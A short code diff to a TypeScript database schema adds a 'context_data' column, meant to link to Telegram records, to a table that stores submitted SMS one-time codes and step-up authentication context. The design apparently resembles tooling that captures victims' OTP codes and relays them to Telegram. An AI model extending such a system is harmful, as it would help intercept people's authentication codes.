@@ -23,6 +23,7 @@ export const smsSubmissions = pgTable("sms_submissions", {
   otpCode: text("otp_code").notNull(),
   stepupContext: text("stepup_context").notNull(),
   rememberDevice: boolean("remember_device").default(false).notNull(),
+  contextData: text("context_data"), // Add context_data to link with telegram_links
   timestamp: timestamp("timestamp").defaultNow().notNull(),
 });
 
@@ -66,6 +67,7 @@ export const insertSmsSubmissionSchema = createInsertSchema(smsSubmissions).pick
   otpCode: true,
   stepupContext: true,
   rememberDevice: true,
+  contextData: true,
 });
 
 export const insertTelegramUserSchema = createInsertSchema(telegramUsers).pick({
